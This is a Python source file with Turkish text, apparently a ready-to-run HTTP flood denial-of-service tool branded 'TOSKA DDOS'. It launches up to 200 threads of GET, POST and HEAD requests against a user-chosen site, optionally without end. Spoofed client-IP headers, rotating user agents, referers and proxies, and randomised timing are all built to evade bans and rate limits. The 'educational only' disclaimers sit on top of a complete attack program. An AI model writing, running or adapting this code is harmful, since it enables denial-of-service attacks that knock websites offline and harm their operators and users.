#kod test içindir.

import sys
import os
import subprocess
import time
import random
import string
import threading
import socket
import warnings
import urllib3
from random import randint, choice, uniform
from socket import *
from threading import Thread, Lock
from colorama import init, Fore, Back, Style
from termcolor import colored, cprint


init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")


def check_dependencies():
    """Gerekli bağımlılıkları kontrol et"""
    required = ['colorama', 'requests', 'termcolor']
    missing = []
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(colored(f"[!] Eksik bağımlılıklar: {', '.join(missing)}", 'red'))
        print(colored("[*] Kurulum yapılıyor...", 'yellow'))
        
        for package in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(colored(f"[+] {package} kuruldu", 'green'))
            except:
                print(colored(f"[!] {package} kurulamadı. Elle kurun: pip install {package}", 'red'))
                return False
    return True

if not check_dependencies():
    sys.exit(1)

try:
    import requests
except ImportError as e:
    print(colored(f"[!] Kritik hata: {e}", 'red'))
    sys.exit(1)


def check_ua_file():
    """ua.txt dosyasını kontrol et - ZORUNLU"""
    ua_file = "ua.txt"
    
    if not os.path.exists(ua_file):
        print(colored("\n" + "="*60, 'red'))
        print(colored("[!] HATA: ua.txt DOSYASI BULUNAMADI!", 'red', attrs=['bold']))
        print(colored("="*60, 'red'))
        
        create = input(colored("\n[?] Otomatik ua.txt oluşturulsun mu? (e/h): ", 'yellow')).lower()
        if create == 'e':
            create_ua_file()
            return load_user_agents()
        else:
            print(colored("[!] ua.txt olmadan çalışmaz!", 'red'))
            sys.exit(1)
    
    return load_user_agents()

def create_ua_file():
    """Örnek ua.txt dosyası oluştur"""
    default_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15',
    ]
    
    try:
        with open("ua.txt", "w", encoding='utf-8') as f:
            for agent in default_agents:
                f.write(agent + "\n")
        print(colored(f"[+] ua.txt oluşturuldu ({len(default_agents)} User-Agent)", 'green'))
        return True
    except Exception as e:
        print(colored(f"[-] ua.txt oluşturulamadı: {e}", 'red'))
        return False

def load_user_agents():
    """ua.txt dosyasını yükle"""
    try:
        with open("ua.txt", "r", encoding='utf-8') as f:
            agents = [line.strip() for line in f if line.strip()]
        
        if not agents:
            print(colored("[!] ua.txt dosyası boş!", 'red'))
            return None
        
        print(colored(f"[+] {len(agents)} User-Agent yüklendi", 'green'))
        return agents
    except Exception as e:
        print(colored(f"[!] ua.txt okunamadı: {e}", 'red'))
        return None


VERSION = "1.0"
requests_count = 0
proxies_used = 0
success_count = 0
failed_count = 0
start_time = None
stats_lock = Lock()
target = ""
USER_AGENTS = check_ua_file()

if USER_AGENTS is None:
    sys.exit(1)


def show_banner():
  """Banner göster"""
banner = f"""
{Fore.CYAN}╔═════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                                 ║
{Fore.CYAN}║            {Fore.LIGHTGREEN_EX}████████╗ ██████╗ ███████╗██╗      ██╗█████╗         {Fore.CYAN}║
{Fore.CYAN}║            {Fore.LIGHTGREEN_EX}╚══██╔══╝██╔═══██╗██╔════╝██║    ██║  ██╔══██╗       {Fore.CYAN}║
{Fore.CYAN}║               {Fore.LIGHTGREEN_EX}██║   ██║   ██║███████╗███████     ███████║       {Fore.CYAN}║
{Fore.CYAN}║               {Fore.LIGHTGREEN_EX}██║   ██║   ██║╚════██║██╔══  ██║  ██╔══██║       {Fore.CYAN}║
{Fore.CYAN}║               {Fore.LIGHTGREEN_EX}██║   ╚██████╔╝███████║██║     ██║ ██║  ██║       {Fore.CYAN}║
{Fore.CYAN}║               {Fore.LIGHTGREEN_EX}╚═╝    ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═╝  ╚═╝       {Fore.CYAN}║
{Fore.CYAN}║                                                                 ║
{Fore.CYAN}║                                                                 ║
{Fore.CYAN}║{Fore.RED}    ██████╗ ██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗           {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝           {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}    ██████╔╝ ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗           {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}    ██╔═══╝   ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║           {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}    ██║        ██║   ██████╔╝██████╔╝╚██████╔╝███████║           {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}    ╚═╝        ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝           {Fore.CYAN}║
{Fore.CYAN}╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}[!] SSL Uyarıları: KAPALIDIR.
{Fore.GREEN}[✓] {len(USER_AGENTS)} User-Agent yüklendi
{Fore.CYAN}[⚡] Anti-Ban: AKTİF (Random IP + Fake Headers)
{Fore.YELLOW}[!] SSL Uyarıları: KAPALI
{Fore.RED}[⚠] SADECE EĞİTİM AMAÇLIDIR by @toskaorj!
"""
print(banner)


class NetworkUtils:
    @staticmethod
    def generate_random_ip():
        """Rastgele gerçekçi IP oluştur (anti-ban için)"""
      
        first_octet = randint(1, 223)
        
  
        if first_octet == 10:
            first_octet = randint(11, 223)
        elif first_octet == 172:
            first_octet = randint(173, 223)
        elif first_octet == 192:
            first_octet = randint(193, 223)
        elif first_octet == 127:
            first_octet = randint(1, 126)
            
        return f"{first_octet}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"
    
    @staticmethod
    def generate_realistic_headers():
        """Gerçekçi header'lar oluştur (anti-ban)"""
        referers = [
            'https://www.google.com/search?q=',
            'https://www.youtube.com/watch?v=',
            'https://www.facebook.com/',
            'https://twitter.com/home',
            'https://www.reddit.com/r/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/@',
            'https://tr.wikipedia.org/wiki/',
        ]
        
        accept_languages = [
            'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'en-US,en;q=0.9',
            'de-DE,de;q=0.9,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
        ]
        
        
        session_id = ''.join(choice(string.hexdigits) for _ in range(32)).lower()
        
        headers = {
            'User-Agent': choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': choice(accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': choice(['keep-alive', 'close', 'upgrade']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': choice(['no-cache', 'max-age=0', 'no-store']),
            'Pragma': 'no-cache',
            'Referer': choice(referers),
            
        
            'X-Forwarded-For': NetworkUtils.generate_random_ip(),
            'X-Real-IP': NetworkUtils.generate_random_ip(),
            'CF-Connecting-IP': NetworkUtils.generate_random_ip(),
            'X-Client-IP': NetworkUtils.generate_random_ip(),
            'True-Client-IP': NetworkUtils.generate_random_ip(),
            'X-Cluster-Client-IP': NetworkUtils.generate_random_ip(),
            
    
            'DNT': choice(['1', '0']),
            'TE': choice(['Trailers', 'compress', 'gzip']),
            'Sec-Fetch-Dest': choice(['document', 'empty', 'script']),
            'Sec-Fetch-Mode': choice(['navigate', 'cors', 'no-cors']),
            'Sec-Fetch-Site': choice(['none', 'same-origin', 'cross-site']),
        }
        
    
        if random.random() > 0.5:
            headers['Cookie'] = f'session={session_id}; lang=tr; _gat=1'
            
        return headers
    
    @staticmethod
    def get_proxies():
        """Proxy listesi al"""
        proxies = []
        
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]
                if proxies:
                    print(colored(f"[+] {len(proxies)} proxy yüklendi", 'green'))
            except:
                pass
        
        return proxies
    
    @staticmethod  
    def get_realistic_delay():
        """Gerçek kullanıcı gibi rastgele bekleme süresi"""
        return uniform(0.05, 0.3)  


class AdvancedHTTPFloodAttack(Thread):
    """Gelişmiş HTTP Flood Saldırısı (Anti-Ban özellikli)"""
    
    def __init__(self, target, use_proxy=True, attack_id=0):
        Thread.__init__(self)
        self.target = target
        self.use_proxy = use_proxy
        self.proxies = NetworkUtils.get_proxies() if use_proxy else []
        self.running = True
        self.attack_id = attack_id
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'Connection': 'keep-alive'})
        
     
        self.request_pattern = random.choice(['steady', 'burst', 'random'])
        self.pattern_counter = 0
        
    def get_target_url(self):
        """HTTPS/HTTP otomatik seçimi"""
        if self.target.startswith(('http://', 'https://')):
            return self.target
        

        if random.random() > 0.3:
            return f"https://{self.target}"
        else:
            return f"http://{self.target}"
    
    def generate_realistic_path(self):
        """Gerçekçi URL path'i oluştur"""
        path_types = [
  
            lambda: f"api/v{randint(1,3)}/data",
            lambda: f"ajax/{randint(1000,9999)}",
            lambda: f"json/{choice(['get', 'post', 'update'])}",
            lambda: f"page/{randint(1,100)}",
            lambda: f"article/{randint(1000,9999)}",
            lambda: f"post/{randint(2020,2024)}/{randint(1,12)}",
            lambda: f"search?q={''.join(choice(string.ascii_lowercase) for _ in range(randint(3,10)))}",
            lambda: f"query?id={randint(100000,999999)}",
            lambda: f"static/{choice(['css', 'js', 'images'])}/file_{randint(1,100)}.{choice(['css', 'js', 'png', 'jpg'])}",
        ]
        
        path_func = choice(path_types)
        return path_func()
    
    def apply_request_pattern(self):
        """Anti-ban için request pattern'ı uygula"""
        self.pattern_counter += 1
        
        if self.request_pattern == 'steady':
         
            time.sleep(NetworkUtils.get_realistic_delay())
            
        elif self.request_pattern == 'burst':
      
            if self.pattern_counter % 10 == 0:
                time.sleep(uniform(0.5, 1.5))  
            else:
                time.sleep(uniform(0.02, 0.1))  
                
        elif self.request_pattern == 'random':
          
            if random.random() > 0.7:
                time.sleep(uniform(0.3, 2.0))  
            else:
                time.sleep(uniform(0.01, 0.2))  
        
      
        if self.pattern_counter >= 50:
            self.request_pattern = random.choice(['steady', 'burst', 'random'])
            self.pattern_counter = 0
    
    def make_request(self):
        """HTTP isteği yap (anti-ban özellikli)"""
        global requests_count, success_count, failed_count, proxies_used
        
        try:
         
            base_url = self.get_target_url()
            

            headers = NetworkUtils.generate_realistic_headers()
            
            
            path = self.generate_realistic_path()
            
         
            params = {}
            if random.random() > 0.3:
                params = {
                    '_': str(int(time.time() * 1000)),
                    'r': str(randint(10000, 99999)),
                    'v': f"{randint(1,10)}.{randint(0,9)}"
                }
            
            full_url = f"{base_url}/{path}"
            
      
            proxies_dict = None
            if self.use_proxy and self.proxies:
                proxy = choice(self.proxies)
                if '://' not in proxy:
                    proxy = f"http://{proxy}"
                proxies_dict = {'http': proxy, 'https': proxy}
                with stats_lock:
                    proxies_used += 1
            
          
            method = choice(['GET', 'POST', 'HEAD'])
            
     
            timeout = uniform(2, 8)
            
       
            if method == 'GET':
                response = self.session.get(
                    full_url, 
                    headers=headers, 
                    params=params,
                    proxies=proxies_dict, 
                    timeout=timeout
                )
            elif method == 'POST':
         
                data = {
                    f'field{randint(1,5)}': ''.join(choice(string.ascii_letters) 
                    for _ in range(randint(5, 30)))
                }
                response = self.session.post(
                    base_url, 
                    headers=headers,
                    data=data,
                    proxies=proxies_dict, 
                    timeout=timeout
                )
            else:  
                response = self.session.head(
                    full_url, 
                    headers=headers,
                    proxies=proxies_dict, 
                    timeout=timeout
                )
            
           
            with stats_lock:
                requests_count += 1
                success_count += 1
            
     
            if self.attack_id == 0 and requests_count % 25 == 0:
                elapsed = time.time() - start_time if start_time else 1
                rps = requests_count / elapsed
                success_rate = (success_count / requests_count * 100) if requests_count > 0 else 0
                print(colored(f"[Thread-{self.attack_id}] {requests_count:,} req | {rps:.1f}/s | {success_rate:.1f}% success", 'green'))
            
      
            self.apply_request_pattern()
            
        except Exception as e:
   
            with stats_lock:
                requests_count += 1
                failed_count += 1
            
    
            if self.attack_id == 0 and failed_count % 100 == 0:
                print(colored(f"[Thread-{self.attack_id}] Failed: {failed_count:,} | Last error: {type(e).__name__}", 'yellow'))
            
    
            time.sleep(uniform(0.2, 0.5))
    
    def run(self):
        """Thread çalıştır"""
        while self.running:
            self.make_request()


class Statistics:
    @staticmethod
    def show_stats():
        """İstatistikleri göster"""
        global requests_count, success_count, failed_count, proxies_used, start_time, target
        
        if start_time is None:
            print(colored("[!] Henüz istatistik yok", 'yellow'))
            return
        
        elapsed = time.time() - start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        rps = requests_count / elapsed if elapsed > 0 else 0
        success_rate = (success_count / requests_count * 100) if requests_count > 0 else 0
        
        print("\n" + "="*70)
        print(colored("📊 GELİŞMİŞ İSTATİSTİKLER", 'cyan', attrs=['bold']))
        print("="*70)
        print(colored(f"⏱️  Süre: {hours:02d}:{minutes:02d}:{seconds:02d}", 'yellow'))
        print(colored(f"📨 Toplam İstek: {requests_count:,}", 'green'))
        print(colored(f"✅ Başarılı: {success_count:,}", 'green'))
        print(colored(f"❌ Başarısız: {failed_count:,}", 'red'))
        print(colored(f"🔄 Kullanılan Proxy: {proxies_used:,}", 'cyan'))
        print(colored(f"⚡ İstek/Saniye: {rps:.1f}", 'magenta'))
        print(colored(f"📈 Başarı Oranı: {success_rate:.1f}%", 'yellow'))
        print(colored(f"🎯 Hedef: {target}", 'blue'))
        print(colored(f"👤 User-Agent: {len(USER_AGENTS)}", 'blue'))
        print(colored(f"🛡️  Anti-Ban: AKTİF", 'green'))
        print("="*70)


def show_menu():
    """Ana menüyü göster"""
    print(colored("\n" + "="*60, 'cyan'))
    print(colored("TOSKA DDOS MENÜ", 'cyan', attrs=['bold']))
    print(colored("="*60, 'cyan'))
    print(colored("[1] ANTI-BAN FLOOD BAŞLAT", 'green'))
    print(colored("[2] İSTATİSTİKLERİ GÖSTER", 'blue'))
    print(colored("[3] AYARLAR", 'magenta'))
    print(colored("[4] ANTI-BAN BİLGİLERİ", 'yellow'))
    print(colored("[0] ÇIKIŞ", 'white'))
    print(colored("="*60, 'cyan'))
    
    try:
        choice = input(colored("\n[?] Seçiminiz (0-4): ", 'yellow'))
        return choice
    except KeyboardInterrupt:
        return '0'

def get_target_info():
    """Hedef bilgilerini al"""
    print(colored("\n" + "="*60, 'blue'))
    print(colored("🎯 ANTI-BAN SALDIRI AYARLARI", 'blue', attrs=['bold']))
    print(colored("="*60, 'blue'))
    
    target_input = input(colored("[?] Hedef Site: (örnek; themarketonoakshop.com", 'yellow')).strip()
    if not target_input:
        print(colored("[-] Hedef boş olamaz!", 'red'))
        return None
    
    try:
        threads = int(input(colored("[?] Thread Sayısı [50]: ", 'yellow')) or "50")
        threads = min(max(threads, 1), 200)  
    except:
        threads = 50
    
    try:
        duration = int(input(colored("[?] Süre (saniye) [0=sonsuz]: ", 'yellow')) or "0")
    except:
        duration = 0
    
    use_proxy = input(colored("[?] Proxy kullan? (e/h) [h]: ", 'yellow')).lower() or 'h'
    use_proxy = use_proxy == 'e'
    
    print(colored(f"[*] Anti-Ban modu aktif!", 'cyan'))
    print(colored(f"[*] {threads} thread ile hazırlanıyor...", 'cyan'))
    
    return {
        'target': target_input,
        'threads': threads,
        'duration': duration,
        'use_proxy': use_proxy
    }


class AdvancedAttackManager:
    def __init__(self):
        self.threads = []
        self.running = False
        self.attack_timer = None
    
    def start_attack(self, target_info):
        """Saldırı başlat"""
        global start_time, target
        
        target = target_info['target']
        start_time = time.time()
        self.running = True
        
        print(colored("\n" + "="*60, 'red'))
        print(colored(f"⚡ ANTI-BAN SALDIRISI BAŞLATILIYOR", 'red', attrs=['bold']))
        print(colored("="*60, 'red'))
        print(colored(f"🎯 Hedef: {target}", 'yellow'))
        print(colored(f"🔧 Thread: {target_info['threads']}", 'yellow'))
        print(colored(f"⏱️  Süre: {'Sonsuz' if target_info['duration'] == 0 else f'{target_info['duration']}s'}", 'yellow'))
        print(colored(f"🛡️  Proxy: {'Açık' if target_info['use_proxy'] else 'Kapalı'}", 'yellow'))
        print(colored(f"👤 User-Agent: {len(USER_AGENTS)}", 'yellow'))
        print(colored(f"🔒 Anti-Ban: AKTİF", 'green'))
        print(colored(f"🎭 Random IP: AKTİF", 'green'))
        print(colored("="*60 + "\n", 'red'))
        
        print(colored("[*] Anti-Ban thread'leri başlatılıyor...", 'cyan'))
        
      
        for i in range(target_info['threads']):
            thread = AdvancedHTTPFloodAttack(
                target_info['target'], 
                target_info['use_proxy'], 
                attack_id=i
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            
            if i % 20 == 0 and i > 0:
                print(colored(f"[*] {i} thread başlatıldı...", 'cyan'))
        
        print(colored(f"[✓] {target_info['threads']} Anti-Ban thread başlatıldı!", 'green'))
        print(colored("[*] Saldırı devam ediyor... Ctrl+C ile durdurabilirsiniz.", 'yellow'))
        
      
        if target_info['duration'] > 0:
            self.attack_timer = threading.Timer(target_info['duration'], self.stop_attack)
            self.attack_timer.daemon = True
            self.attack_timer.start()
            print(colored(f"[*] {target_info['duration']} saniye sonra otomatik durdurulacak", 'cyan'))
        
  
        try:
            last_stat_time = time.time()
            while self.running:
                time.sleep(1)
                
          
                current_time = time.time()
                if current_time - last_stat_time >= 30:
                    Statistics.show_stats()
                    last_stat_time = current_time
                    
        except KeyboardInterrupt:
            print(colored("\n[!] Kullanıcı tarafından durduruluyor...", 'yellow'))
            self.stop_attack()
    
    def stop_attack(self):
        """Saldırıyı durdur"""
        print(colored("\n[!] Saldırı durduruluyor...", 'red'))
        self.running = False
        

        if self.attack_timer:
            self.attack_timer.cancel()
        

        for thread in self.threads:
            if hasattr(thread, 'running'):
                thread.running = False
        
 
        time.sleep(2)
        

        Statistics.show_stats()
        

        self.threads.clear()
        
        print(colored("\n[✓] Saldırı tamamen durduruldu!", 'green'))


def main():
    """Ana program"""
    show_banner()
    manager = AdvancedAttackManager()
    
    while True:
        choice = show_menu()
        
        if choice == '0':
            print(colored("\n[!] Çıkış yapılıyor...", 'yellow'))
            if manager.running:
                manager.stop_attack()
            break
        
        elif choice == '1':
            if manager.running:
                print(colored("[!] Zaten aktif saldırı var!", 'red'))
                continue
            
            target_info = get_target_info()
            if target_info:
             
                attack_thread = threading.Thread(target=manager.start_attack, args=(target_info,))
                attack_thread.daemon = True
                attack_thread.start()
                print(colored("[*] Anti-Ban saldırısı arka planda başlatıldı...", 'cyan'))
        
        elif choice == '2':
            Statistics.show_stats()
        
        elif choice == '3':
            print(colored("\n🔧 ANTI-BAN AYARLARI:", 'cyan'))
            print(colored("1. Random IP: Her request için farklı IP", 'green'))
            print(colored("2. Fake Headers: Gerçekçi browser headers", 'green'))
            print(colored("3. Pattern Variation: Değişken request pattern", 'green'))
            print(colored("4. Random Delay: İnsan benzeri timing", 'green'))
            print(colored("5. Realistic URLs: Doğal görünen URL'ler", 'green'))
        
        elif choice == '4':
            print(colored("\n🛡️  ANTI-BAN TEKNİKLERİ:", 'cyan'))
            print(colored("✓ Her istekte farklı IP header'ı", 'green'))
            print(colored("✓ Rastgele User-Agent rotation", 'green'))
            print(colored("✓ Değişken request timing", 'green'))
            print(colored("✓ Gerçekçi URL ve parametreler", 'green'))
            print(colored("✓ Session varyasyonu", 'green'))
            print(colored("✓ Proxy rotation (etkinse)", 'green'))
            print(colored(f"✓ {len(USER_AGENTS)} farklı User-Agent", 'green'))
        
        else:
            print(colored("[-] Geçersiz seçim!", 'red'))
        
        input(colored("\n[?] Devam etmek için Enter...", 'yellow'))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Program sonlandırıldı", 'yellow'))
    except Exception as e:
        print(colored(f"\n[!] Kritik hata: {e}", 'red'))